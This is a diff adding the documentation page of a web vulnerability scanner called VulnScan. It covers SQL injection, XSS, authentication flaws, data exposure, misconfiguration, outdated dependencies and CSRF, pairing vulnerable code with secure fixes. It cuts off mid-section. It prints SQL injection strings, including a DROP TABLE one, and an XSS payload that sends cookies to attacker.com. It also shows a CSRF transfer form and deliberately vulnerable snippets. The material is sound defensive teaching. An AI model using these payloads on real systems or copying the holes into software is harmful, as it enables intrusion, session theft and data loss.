@@ -1,0 +1,1907 @@
+{% extends "base.html" %}
+
+{% block content %}
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>VulnScan Documentation</title>
+    <!-- Responsive Design -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- Bootstrap CSS -->
+    <!-- Font Awesome for Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" />
+    <!-- Custom CSS -->
+    <style>
+        .documentation {
+            padding: 2rem 0;
+        }
+        
+        .doc-header {
+            text-align: center;
+            margin-bottom: 3rem;
+            padding: 2rem;
+            background: var(--card-background);;
+            border-radius: 8px;
+        }
+        
+        .doc-header h1 {
+            color: var(--primary-color);
+            margin-bottom: 1rem;
+        }
+        
+        .doc-header i {
+            margin-right: 0.5rem;
+        }
+        
+        .doc-section {
+            background: var(--card-background);;
+            border-radius: 8px;
+            padding: 2rem;
+            margin-bottom: 2rem;
+        }
+        
+        .doc-section h2 {
+            color: var(--primary-color);
+            border-bottom: 2px solid var(--primary-color);
+            padding-bottom: 0.5rem;
+            margin-bottom: 1.5rem;
+        }
+        
+        .doc-content {
+            padding: 1rem;
+        }
+        
+        .vuln-type, .feature {
+            background: rgba(255, 0, 0, 0.05);
+            border-radius: 6px;
+            padding: 1.5rem;
+            margin-bottom: 1rem;
+            transition: transform 0.2s;
+        }
+        
+        .vuln-type:hover, .feature:hover {
+            transform: translateX(10px);
+            background: rgba(255, 255, 255, 0.1);
+        }
+        
+        .vuln-type h3, .feature h3 {
+            color: var(--text-color);
+            margin-bottom: 1rem;
+        }
+        
+        .vuln-type i, .feature i {
+            color: var(--primary-color);
+            margin-right: 0.5rem;
+        }
+        
+        .doc-content ol {
+            padding-left: 1.5rem;
+        }
+        
+        .doc-content li {
+            margin-bottom: 0.5rem;
+            color: var(--text-color);
+        }
+        
+        .lead {
+            color: var(--text-secondary);
+            font-size: 1.2rem;
+        }
+        </style>
+</head>
+<body>
+    <div class="container">
+        <h1 class="text-center mb-4">VulnScan Security Documentation</h1>
+        <div class="row mb-5">
+            <div class="col-md-8 offset-md-2">
+                <div class="card">
+                    <div class="card-body">
+                        <h5>About This Documentation</h5>
+                        <p>This comprehensive guide details the security vulnerabilities detected by VulnScan, including:</p>
+                        <ul>
+                            <li>Detailed vulnerability descriptions and attack vectors</li>
+                            <li>Real-world examples and impact scenarios</li>
+                            <li>Detection methodologies used by VulnScan</li>
+                            <li>Practical mitigation strategies</li>
+                            <li>Code examples showing vulnerable and secure implementations</li>
+                        </ul>
+                        <p>Severity levels are classified as:</p>
+                        <div class="d-flex gap-2">
+                            <span class="badge severity-critical">Critical</span>
+                            <span class="badge severity-high">High</span>
+                            <span class="badge severity-medium">Medium</span>
+                            <span class="badge severity-low">Low</span>
+                            <span class="badge severity-info">Info</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="accordion" id="documentationAccordion">
+            <!-- 1. SQL Injection -->
+            <div class="accordion-item">
+                <h2 class="accordion-header" id="heading1">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse1" aria-expanded="false" aria-controls="collapse1">
+                        1. SQL Injection <span class="badge severity-critical">Critical</span>
+                    </button>
+                </h2>
+                <div id="collapse1" class="accordion-collapse collapse" aria-labelledby="heading1" data-bs-parent="#documentationAccordion">
+                    <div class="accordion-body">
+                        <p><strong>Description:</strong> SQL Injection occurs when untrusted input is inserted into SQL queries without proper sanitization, allowing attackers to manipulate the query's logic or extract sensitive data.</p>
+                        
+                        <h6>Attack Vectors:</h6>
+                        <ul>
+                            <li>User input fields (login forms, search boxes)</li>
+                            <li>URL parameters</li>
+                            <li>HTTP headers</li>
+                            <li>Cookie values</li>
+                        </ul>
+
+                        <h6>Example Attacks:</h6>
+                        <div class="code-example vulnerable">
+                            <p class="mb-2">Vulnerable Query:</p>
+                            <code class="code-block">
+                                SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'
+                            </code>
+                        </div>
+                        
+                        <p><strong>Malicious Input:</strong></p>
+                        <ul>
+                            <li><code>admin' --</code> (Bypasses password check)</li>
+                            <li><code>admin' UNION SELECT * FROM credit_cards; --</code> (Data extraction)</li>
+                            <li><code>admin'; DROP TABLE users; --</code> (Database manipulation)</li>
+                        </ul>
+
+                        <div class="mitigation">
+                            <h6>Mitigation Strategies:</h6>
+                            <ul>
+                                <li>Use parameterized queries or prepared statements</li>
+                                <li>Implement input validation and sanitization</li>
+                                <li>Apply the principle of least privilege for database users</li>
+                                <li>Use ORM frameworks with built-in SQL injection protection</li>
+                            </ul>
+                        </div>
+
+                        <div class="code-example secure">
+                            <p class="mb-2">Secure Implementation:</p>
+                            <code class="code-block">
+                                const query = 'SELECT * FROM users WHERE username = ? AND password = ?';<br>
+                                db.execute(query, [username, password]);
+                            </code>
+                        </div>
+
+                        <div class="reference-links">
+                            <h6>Learn More:</h6>
+                            <ul>
+                                <li><a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">OWASP SQL Injection Guide</a></li>
+                                <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" target="_blank">OWASP SQL Injection Prevention Cheat Sheet</a></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <!-- 2. Cross-Site Scripting (XSS) -->
+            <div class="accordion-item">
+                <h2 class="accordion-header" id="heading2">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse2" aria-expanded="false" aria-controls="collapse2">
+                        2. Cross-Site Scripting (XSS) <span class="badge severity-high">High</span>
+                    </button>
+                </h2>
+                <div id="collapse2" class="accordion-collapse collapse" aria-labelledby="heading2" data-bs-parent="#documentationAccordion">
+                    <div class="accordion-body">
+                        <p><strong>Description:</strong> Cross-Site Scripting occurs when malicious scripts are injected into trusted websites. These scripts execute in the victim's browser under the security context of the vulnerable site, allowing attackers to steal sensitive information, hijack user sessions, or deface websites.</p>
+                        
+                        <h6>Types of XSS:</h6>
+                        <ul>
+                            <li><strong>Reflected XSS:</strong> Malicious script is reflected off the web server in an error message or search result</li>
+                            <li><strong>Stored XSS:</strong> Malicious script is stored on the target server (e.g., in database)</li>
+                            <li><strong>DOM-based XSS:</strong> Vulnerability exists in client-side code rather than server-side code</li>
+                        </ul>
+
+                        <h6>Common Attack Vectors:</h6>
+                        <div class="code-example vulnerable">
+                            <p class="mb-2">Vulnerable Code Examples:</p>
+                            <code class="code-block">
+                                // Reflected XSS<br>
+                                &lt;p&gt;Hello, &lt;?= $_GET['name'] ?&gt;!&lt;/p&gt;<br><br>
+                                // Stored XSS<br>
+                                &lt;div&gt;&lt;?= $comment ?&gt;&lt;/div&gt;<br><br>
+                                // DOM-based XSS<br>
+                                element.innerHTML = location.hash.substring(1);
+                            </code>
+                        </div>
+                        
+                        <p><strong>Example Payloads:</strong></p>
+                        <ul>
+                            <li><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></li>
+                            <li><code>&lt;img src="x" onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)"&gt;</code></li>
+                            <li><code>&lt;svg onload="eval(atob('base64_encoded_payload'))"&gt;</code></li>
+                        </ul>
+
+                        <div class="mitigation">
+                            <h6>Mitigation Strategies:</h6>
+                            <ul>
+                                <li>Context-aware output encoding</li>
+                                <li>Input validation and sanitization</li>
+                                <li>Content Security Policy (CSP) implementation</li>
+                                <li>Use of modern frameworks with built-in XSS protection</li>
+                                <li>HTTP-only cookies for sensitive data</li>
+                            </ul>
+                        </div>
+
+                        <div class="code-example secure">
+                            <p class="mb-2">Secure Implementation:</p>
+                            <code class="code-block">
+                                // Server-side encoding<br>
+                                &lt;p&gt;Hello, &lt;?= htmlspecialchars($_GET['name'], ENT_QUOTES) ?&gt;!&lt;/p&gt;<br><br>
+                                // Client-side safe assignment<br>
+                                element.textContent = userInput;<br><br>
+                                // React's automatic escaping<br>
+                                function Welcome(props) {<br>
+                                &nbsp;&nbsp;return &lt;p&gt;Hello, {props.name}!&lt;/p&gt;;<br>
+                                }
+                            </code>
+                        </div>
+
+                        <h6>Detection Methods:</h6>
+                        <p>VulnScan employs multiple techniques to detect XSS vulnerabilities:</p>
+                        <ul>
+                            <li>Injection of special character sequences</li>
+                            <li>Analysis of reflected input in responses</li>
+                            <li>DOM manipulation checks</li>
+                            <li>Evaluation of JavaScript execution contexts</li>
+                        </ul>
+
+                        <div class="reference-links">
+                            <h6>Learn More:</h6>
+                            <ul>
+                                <li><a href="https://owasp.org/www-community/attacks/xss/" target="_blank">OWASP XSS Guide</a></li>
+                                <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank">OWASP XSS Prevention Cheat Sheet</a></li>
+                                <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" target="_blank">MDN Content Security Policy</a></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <!-- 3. Broken Authentication -->
+            <div class="accordion-item">
+                <h2 class="accordion-header" id="heading3">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse3" aria-expanded="false" aria-controls="collapse3">
+                        3. Broken Authentication <span class="badge severity-high">High</span>
+                    </button>
+                </h2>
+                <div id="collapse3" class="accordion-collapse collapse" aria-labelledby="heading3" data-bs-parent="#documentationAccordion">
+                    <div class="accordion-body">
+                        <p><strong>Description:</strong> Broken Authentication occurs when weaknesses in authentication mechanisms allow attackers to compromise passwords, keys, session tokens, or exploit implementation flaws to assume other users' identities temporarily or permanently.</p>
+                        
+                        <h6>Common Vulnerabilities:</h6>
+                        <ul>
+                            <li>Weak password requirements</li>
+                            <li>Weak session management</li>
+                            <li>Credential stuffing attacks</li>
+                            <li>Brute force attacks</li>
+                            <li>Password recovery weaknesses</li>
+                            <li>Missing multi-factor authentication</li>
+                        </ul>
+
+                        <h6>Attack Scenarios:</h6>
+                        <div class="code-example vulnerable">
+                            <p class="mb-2">Vulnerable Implementation Examples:</p>
+                            <code class="code-block">
+                                // Weak Password Validation<br>
+                                function validatePassword(password) {<br>
+                                &nbsp;&nbsp;return password.length >= 6;<br>
+                                }<br><br>
+                                // Insecure Session Management<br>
+                                session_id = Math.random().toString();<br>
+                                document.cookie = "sessionId=" + session_id;<br><br>
+                                // Vulnerable Password Reset<br>
+                                function resetPassword(email) {<br>
+                                &nbsp;&nbsp;const tempPass = "reset123";<br>
+                                &nbsp;&nbsp;sendEmail(email, tempPass);<br>
+                                }
+                            </code>
+                        </div>
+
+                        <div class="mitigation">
+                            <h6>Mitigation Strategies:</h6>
+                            <ul>
+                                <li><strong>Strong Password Policy:</strong>
+                                    <ul>
+                                        <li>Minimum length of 12 characters</li>
+                                        <li>Mix of uppercase, lowercase, numbers, and special characters</li>
+                                        <li>Check against commonly used/compromised passwords</li>
+                                    </ul>
+                                </li>
+                                <li><strong>Secure Session Management:</strong>
+                                    <ul>
+                                        <li>Use cryptographically secure session IDs</li>
+                                        <li>Implement proper session timeout</li>
+                                        <li>Secure session storage and transmission</li>
+                                    </ul>
+                                </li>
+                                <li><strong>Multi-Factor Authentication (MFA):</strong>
+                                    <ul>
+                                        <li>Implement MFA for sensitive operations</li>
+                                        <li>Use secure MFA methods (TOTP, hardware tokens)</li>
+                                    </ul>
+                                </li>
+                                <li><strong>Rate Limiting:</strong>
+                                    <ul>
+                                        <li>Implement account lockout after failed attempts</li>
+                                        <li>Add CAPTCHA for login attempts</li>
+                                    </ul>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <div class="code-example secure">
+                            <p class="mb-2">Secure Implementation:</p>
+                            <code class="code-block">
+                                // Strong Password Validation<br>
+                                function validatePassword(password) {<br>
+                                &nbsp;&nbsp;const minLength = 12;<br>
+                                &nbsp;&nbsp;const hasUpperCase = /[A-Z]/.test(password);<br>
+                                &nbsp;&nbsp;const hasLowerCase = /[a-z]/.test(password);<br>
+                                &nbsp;&nbsp;const hasNumbers = /\d/.test(password);<br>
+                                &nbsp;&nbsp;const hasSpecialChar = /[!@#$%^&*]/.test(password);<br>
+                                &nbsp;&nbsp;return password.length >= minLength &&<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;hasUpperCase && hasLowerCase &&<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;hasNumbers && hasSpecialChar;<br>
+                                }<br><br>
+                                // Secure Session Management<br>
+                                const session = {<br>
+                                &nbsp;&nbsp;id: crypto.randomUUID(),<br>
+                                &nbsp;&nbsp;created: Date.now(),<br>
+                                &nbsp;&nbsp;expires: Date.now() + (30 * 60 * 1000) // 30 minutes<br>
+                                };<br><br>
+                                // Secure Password Reset<br>
+                                async function resetPassword(email) {<br>
+                                &nbsp;&nbsp;const token = crypto.randomBytes(32).toString('hex');<br>
+                                &nbsp;&nbsp;const expiry = Date.now() + (60 * 60 * 1000); // 1 hour<br>
+                                &nbsp;&nbsp;await storeResetToken(email, token, expiry);<br>
+                                &nbsp;&nbsp;await sendResetEmail(email, token);<br>
+                                }
+                            </code>
+                        </div>
+
+                        <h6>Detection Methods:</h6>
+                        <p>VulnScan checks for authentication vulnerabilities through:</p>
+                        <ul>
+                            <li>Password policy analysis</li>
+                            <li>Session token entropy testing</li>
+                            <li>Brute force attack simulation</li>
+                            <li>Password reset flow analysis</li>
+                            <li>Session management testing</li>
+                            <li>MFA implementation verification</li>
+                        </ul>
+
+                        <div class="reference-links">
+                            <h6>Learn More:</h6>
+                            <ul>
+                                <li><a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication" target="_blank">OWASP Broken Authentication</a></li>
+                                <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html" target="_blank">OWASP Authentication Cheat Sheet</a></li>
+                                <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html" target="_blank">OWASP Session Management Cheat Sheet</a></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <!-- 4. Sensitive Data Exposure -->
+            <div class="accordion-item">
+                <h2 class="accordion-header" id="heading4">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse4" aria-expanded="false" aria-controls="collapse4">
+                        4. Sensitive Data Exposure <span class="badge severity-medium">Medium</span>
+                    </button>
+                </h2>
+                <div id="collapse4" class="accordion-collapse collapse" aria-labelledby="heading4" data-bs-parent="#documentationAccordion">
+                    <div class="accordion-body">
+                        <p><strong>Description:</strong> Sensitive Data Exposure occurs when an application does not adequately protect sensitive information such as financial data, healthcare information, or credentials. This data could be exposed in storage, during transmission, or through application behavior.</p>
+                        
+                        <h6>Common Types of Sensitive Data:</h6>
+                        <ul>
+                            <li>Passwords and authentication tokens</li>
+                            <li>Credit card numbers and financial data</li>
+                            <li>Personal identifiable information (PII)</li>
+                            <li>Healthcare records (PHI)</li>
+                            <li>Business secrets and intellectual property</li>
+                            <li>Session tokens and cookies</li>
+                        </ul>
+
+                        <h6>Common Exposure Points:</h6>
+                        <div class="code-example vulnerable">
+                            <p class="mb-2">Vulnerable Implementation Examples:</p>
+                            <code class="code-block">
+                                // Plaintext Password Storage
+                                const user = {
+                                    email: 'user@example.com',
+                                    password: 'userpassword123'  // Stored as plaintext
+                                };
+
+                                // Insecure Data Transmission
+                                fetch('http://api.example.com/payment', {  // Using HTTP instead of HTTPS
+                                    method: 'POST',
+                                    body: JSON.stringify({
+                                        cardNumber: '4111-1111-1111-1111',
+                                        cvv: '123'
+                                    })
+                                });
+
+                                // Verbose Error Messages
+                                if (!user) {
+                                    throw new Error('User johndoe@example.com not found');  // Leaks email
+                                }
+                            </code>
+                        </div>
+
+                        <div class="mitigation">
+                            <h6>Mitigation Strategies:</h6>
+                            <ul>
+                                <li><strong>Data Classification:</strong>
+                                    <ul>
+                                        <li>Identify and classify sensitive data</li>
+                                        <li>Apply appropriate protection levels</li>
+                                        <li>Implement data handling policies</li>
+                                    </ul>
+                                </li>
+                                <li><strong>Encryption:</strong>
+                                    <ul>
+                                        <li>Use strong encryption algorithms (AES-256, RSA)</li>
+                                        <li>Implement TLS 1.3 for data in transit</li>
+                                        <li>Secure key management practices</li>
+                                    </ul>
+                                </li>
+                                <li><strong>Access Controls:</strong>
+                                    <ul>
+                                        <li>Implement principle of least privilege</li>
+                                        <li>Regular access reviews</li>
+                                        <li>Audit logging of sensitive data access</li>
+                                    </ul>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <div class="code-example secure">
+                            <p class="mb-2">Secure Implementation:</p>
+                            <code class="code-block">
+                                // Secure Password Storage
+                                const user = {
+                                    email: 'user@example.com',
+                                    password: await bcrypt.hash(password, 12)  // Hashed password
+                                };
+
+                                // Secure Data Transmission
+                                fetch('https://api.example.com/payment', {  // Using HTTPS
+                                    method: 'POST',
+                                    headers: {
+                                        'Content-Type': 'application/json',
+                                        'X-Content-Type-Options': 'nosniff'
+                                    },
+                                    body: JSON.stringify({
+                                        cardNumber: await encrypt(cardNumber),
+                                        cvv: await encrypt(cvv)
+                                    })
+                                });
+
+                                // Generic Error Messages
+                                if (!user) {
+                                    throw new Error('Invalid credentials');  // Generic message
+                                }
+                            </code>
+                        </div>
+
+                        <h6>Detection Methods:</h6>
+                        <p>VulnScan employs multiple techniques to detect sensitive data exposure:</p>
+                        <ul>
+                            <li>Pattern matching for sensitive data formats (credit cards, SSNs)</li>
+                            <li>Analysis of encryption implementation</li>
+                            <li>TLS/SSL configuration checks</li>
+                            <li>Error message analysis</li>
+                            <li>Data flow tracking</li>
+                            <li>Source code review for hardcoded secrets</li>
+                        </ul>
+
+                        <div class="reference-links">
+                            <h6>Learn More:</h6>
+                            <ul>
+                                <li><a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" target="_blank">OWASP Sensitive Data Exposure</a></li>
+                                <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html" target="_blank">OWASP Cryptographic Storage Cheat Sheet</a></li>
+                                <li><a href="https://www.nist.gov/publications/advanced-encryption-standard-aes" target="_blank">NIST AES Guidelines</a></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <!-- 5. Security Misconfiguration -->
+            <div class="accordion-item">
+                <h2 class="accordion-header" id="heading5">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse5" aria-expanded="false" aria-controls="collapse5">
+                        5. Security Misconfiguration <span class="badge severity-medium">Medium</span>
+                    </button>
+                </h2>
+                <div id="collapse5" class="accordion-collapse collapse" aria-labelledby="heading5" data-bs-parent="#documentationAccordion">
+                    <div class="accordion-body">
+                        <p><strong>Description:</strong> Security Misconfiguration occurs when security settings are not properly defined, implemented, or maintained. This includes insecure default configurations, incomplete configurations, open cloud storage, verbose error messages, or outdated software.</p>
+                        
+                        <h6>Common Misconfigurations:</h6>
+                        <ul>
+                            <li>Default credentials still in use</li>
+                            <li>Unnecessary features enabled</li>
+                            <li>Insecure HTTP methods allowed</li>
+                            <li>Directory listing enabled</li>
+                            <li>Outdated software versions</li>
+                            <li>Debug mode enabled in production</li>
+                            <li>Insecure default settings</li>
+                            <li>Missing security headers</li>
+                        </ul>
+
+                        <h6>Example Vulnerabilities:</h6>
+                        <div class="code-example vulnerable">
+                            <p class="mb-2">Vulnerable Configurations:</p>
+                            <code class="code-block">
+                                # Nginx with Directory Listing Enabled
+                                location /uploads/ {
+                                    autoindex on;  # Dangerous - shows directory contents
+                                }
+
+                                # Django Debug Mode in Production
+                                DEBUG = True  # Exposes sensitive information
+
+                                # Insecure PHP Configuration
+                                display_errors = On
+                                allow_url_include = On
+                                expose_php = On
+
+                                # Weak TLS Configuration
+                                ssl_protocols TLSv1 TLSv1.1;  # Outdated protocols
+                                ssl_ciphers 'ALL:!NULL';  # Weak ciphers allowed
+                            </code>
+                        </div>
+
+                        <div class="mitigation">
+                            <h6>Mitigation Strategies:</h6>
+                            <ul>
+                                <li><strong>Secure Default Configuration:</strong>
+                                    <ul>
+                                        <li>Remove default accounts and passwords</li>
+                                        <li>Disable unnecessary features and frameworks</li>
+                                        <li>Update all software to latest stable versions</li>
+                                    </ul>
+                                </li>
+                                <li><strong>Security Headers:</strong>
+                                    <ul>
+                                        <li>Implement HSTS</li>
+                                        <li>Set secure cookie flags</li>
+                                        <li>Configure CSP</li>
+                                        <li>Enable XSS protection</li>
+                                    </ul>
+                                </li>
+                                <li><strong>Error Handling:</strong>
+                                    <ul>
+                                        <li>Disable detailed error messages in production</li>
+                                        <li>Implement custom error pages</li>
+                                        <li>Log errors securely</li>
+                                    </ul>
+                                </li>
+                                <li><strong>Regular Audits:</strong>
+                                    <ul>
+                                        <li>Security configuration review</li>
+                                        <li>Vulnerability scanning</li>
+                                        <li>Penetration testing</li>
+                                    </ul>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <div class="code-example secure">
+                            <p class="mb-2">Secure Configuration Examples:</p>
+                            <code class="code-block">
+                                # Secure Nginx Configuration
+                                location /uploads/ {
+                                    autoindex off;
+                                    add_header X-Content-Type-Options "nosniff";
+                                    add_header X-Frame-Options "DENY";
+                                }
+
+                                # Secure Django Settings
+                                DEBUG = False
+                                SECURE_SSL_REDIRECT = True
+                                SESSION_COOKIE_SECURE = True
+                                CSRF_COOKIE_SECURE = True
+                                SECURE_BROWSER_XSS_FILTER = True
+                                SECURE_CONTENT_TYPE_NOSNIFF = True
+
+                                # Secure PHP Configuration
+                                display_errors = Off
+                                allow_url_include = Off
+                                expose_php = Off
+                                session.cookie_secure = On
+                                session.cookie_httponly = On
+
+                                # Strong TLS Configuration
+                                ssl_protocols TLSv1.2 TLSv1.3;
+                                ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
+                                ssl_prefer_server_ciphers off;
+                            </code>
+                        </div>
+
+                        <h6>Detection Methods:</h6>
+                        <p>VulnScan checks for security misconfigurations through:</p>
+                        <ul>
+                            <li>HTTP response header analysis</li>
+                            <li>Default credential testing</li>
+                            <li>Directory enumeration</li>
+                            <li>Framework fingerprinting</li>
+                            <li>SSL/TLS configuration testing</li>
+                            <li>Error message analysis</li>
+                            <li>Security header verification</li>
+                            <li>Version detection of components</li>
+                        </ul>
+
+                        <div class="reference-links">
+                            <h6>Learn More:</h6>
+                            <ul>
+                                <li><a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" target="_blank">OWASP Security Misconfiguration</a></li>
+                                <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Configuration_Management_Cheat_Sheet.html" target="_blank">OWASP Configuration Management Cheat Sheet</a></li>
+                                <li><a href="https://www.ssllabs.com/projects/best-practices/" target="_blank">SSL/TLS Deployment Best Practices</a></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <!-- 6. Using Components with Known Vulnerabilities -->
+            <div class="accordion-item">
+                <h2 class="accordion-header" id="heading6">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse6" aria-expanded="false" aria-controls="collapse6">
+                        6. Using Components with Known Vulnerabilities <span class="badge severity-high">High</span>
+                    </button>
+                </h2>
+                <div id="collapse6" class="accordion-collapse collapse" aria-labelledby="heading6" data-bs-parent="#documentationAccordion">
+                    <div class="accordion-body">
+                        <p><strong>Description:</strong> Applications often use third-party components (libraries, frameworks, software modules) that may contain known vulnerabilities. Attackers can exploit these vulnerabilities to compromise the application if components are not regularly updated and patched.</p>
+                        
+                        <h6>Common Vulnerable Components:</h6>
+                        <ul>
+                            <li>Frontend frameworks and libraries</li>
+                            <li>Backend dependencies</li>
+                            <li>Database management systems</li>
+                            <li>Operating system packages</li>
+                            <li>Container images</li>
+                            <li>Content Management Systems (CMS)</li>
+                        </ul>
+
+                        <h6>Example Vulnerabilities:</h6>
+                        <div class="code-example vulnerable">
+                            <p class="mb-2">Vulnerable Dependencies:</p>
+                            <code class="code-block">
+                                // package.json with vulnerable dependencies
+                                {
+                                    "dependencies": {
+                                        "jquery": "1.11.3",  // Known XSS vulnerability
+                                        "lodash": "4.17.15",  // Prototype pollution
+                                        "node-fetch": "2.6.0"  // SSRF vulnerability
+                                    }
+                                }
+
+                                # requirements.txt with outdated versions
+                                Django==2.2.24  # Multiple vulnerabilities
+                                Pillow==7.1.0   # Buffer overflow
+                                requests==2.23.0 # TLS verification issues
+
+                                # Dockerfile using outdated base image
+                                FROM node:12.22.1  # Contains multiple CVEs
+                                FROM python:3.6-alpine  # End of life version
+                            </code>
+                        </div>
+
+                        <div class="mitigation">
+                            <h6>Mitigation Strategies:</h6>
+                            <ul>
+                                <li><strong>Dependency Management:</strong>
+                                    <ul>
+                                        <li>Regular dependency updates</li>
+                                        <li>Automated vulnerability scanning</li>
+                                        <li>Version pinning with SHA hashes</li>
+                                        <li>Dependency lockfiles</li>
+                                    </ul>
+                                </li>
+                                <li><strong>Continuous Monitoring:</strong>
+                                    <ul>
+                                        <li>Subscribe to security advisories</li>
+                                        <li>Automated security updates</li>
+                                        <li>Regular security audits</li>
+                                    </ul>
+                                </li>
+                                <li><strong>Component Inventory:</strong>
+                                    <ul>
+                                        <li>Maintain Software Bill of Materials (SBOM)</li>
+                                        <li>Track direct and transitive dependencies</li>
+                                        <li>Document component versions and sources</li>
+                                    </ul>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <div class="code-example secure">
+                            <p class="mb-2">Secure Implementation:</p>
+                            <code class="code-block">
+                                // package.json with secure versions
+                                {
+                                    "dependencies": {
+                                        "jquery": "3.6.4",
+                                        "lodash": "4.17.21",
+                                        "node-fetch": "2.6.9"
+                                    },
+                                    "scripts": {
+                                        "audit": "npm audit",
+                                        "outdated": "npm outdated"
+                                    }
+                                }
+
+                                # requirements.txt with pinned secure versions
+                                Django==4.2.7  # Latest LTS version
+                                Pillow==10.1.0 # Latest secure version
+                                requests==2.31.0
+
+                                # Dockerfile with secure base images
+                                FROM node:20.9.0-slim  # Latest LTS
+                                FROM python:3.12-alpine  # Latest stable
+
+                                # Add security scanning
+                                RUN npm audit
+                                RUN safety check
+                            </code>
+                        </div>
+
+                        <h6>Detection Methods:</h6>
+                        <p>VulnScan identifies vulnerable components through:</p>
+                        <ul>
+                            <li>Dependency manifest analysis (package.json, requirements.txt)</li>
+                            <li>Version fingerprinting of components</li>
+                            <li>CVE database correlation</li>
+                            <li>OWASP Dependency-Check integration</li>
+                            <li>Container image scanning</li>
+                            <li>Software composition analysis (SCA)</li>
+                        </ul>
+
+                        <div class="mitigation">
+                            <h6>Recommended Tools:</h6>
+                            <ul>
+                                <li><strong>JavaScript/Node.js:</strong>
+                                    <ul>
+                                        <li>npm audit</li>
+                                        <li>Snyk</li>
+                                        <li>WhiteSource</li>
+                                    </ul>
+                                </li>
+                                <li><strong>Python:</strong>
+                                    <ul>
+                                        <li>Safety</li>
+                                        <li>PyUp</li>
+                                        <li>pip-audit</li>
+                                    </ul>
+                                </li>
+                                <li><strong>Container Security:</strong>
+                                    <ul>
+                                        <li>Trivy</li>
+                                        <li>Clair</li>
+                                        <li>Anchore</li>
+                                    </ul>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <div class="reference-links">
+                            <h6>Learn More:</h6>
+                            <ul>
+                                <li><a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities" target="_blank">OWASP Known Vulnerabilities</a></li>
+                                <li><a href="https://nvd.nist.gov/" target="_blank">National Vulnerability Database</a></li>
+                                <li><a href="https://github.com/advisories" target="_blank">GitHub Security Advisories</a></li>
+                                <li><a href="https://snyk.io/vuln" target="_blank">Snyk Vulnerability Database</a></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <!-- 7. Cross-Site Request Forgery (CSRF) -->
+            <div class="accordion-item">
+                <h2 class="accordion-header" id="heading7">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse7" aria-expanded="false" aria-controls="collapse7">
+                        7. Cross-Site Request Forgery (CSRF) <span class="badge severity-high">High</span>
+                    </button>
+                </h2>
+                <div id="collapse7" class="accordion-collapse collapse" aria-labelledby="heading7" data-bs-parent="#documentationAccordion">
+                    <div class="accordion-body">
+                        <p><strong>Description:</strong> CSRF attacks force authenticated users to execute unwanted actions on a web application in which they're currently authenticated. The attacker crafts a malicious request that inherits the identity and privileges of the victim to perform an undesired function on their behalf.</p>
+                        
+                        <h6>Common Attack Vectors:</h6>
+                        <ul>
+                            <li>Form submissions without CSRF tokens</li>
+                            <li>State-changing GET requests</li>
+                            <li>Missing or weak Same-Origin policies</li>
+                            <li>Predictable form fields</li>
+                            <li>Cookie-based session handling without additional protections</li>
+                        </ul>
+
+                        <div class="code-example vulnerable">
+                            <p class="mb-2">Vulnerable Implementation:</p>
+                            <code class="code-block">
+                                <!-- Vulnerable Form Without CSRF Protection -->
+                                <form action="/transfer" method="POST">
+                                    <input type="hidden" name="to" value="attacker_account">
+                                    <input type="hidden" name="amount" value="1000">
+                                    <button type="submit">Click Here!</button>
+                                </form>
+
+                                // Vulnerable API Endpoint
+                                @app.route('/transfer', methods=['POST'])
+                                def transfer_money():
+                                    to_account = request.form['to']
+                                    amount = request.form['amount']
+                                    return process_transfer(to_account, amount)
+                            </code>
+                        </div>
+
+                        <div class="mitigation">
+                            <h6>Mitigation Strategies:</h6>
+                            <ul>
+                                <li><strong>CSRF Tokens:</strong>
+                                    <ul>
+                                        <li>Implement per-session or per-request tokens</li>
+                                        <li>Include tokens in forms and headers</li>
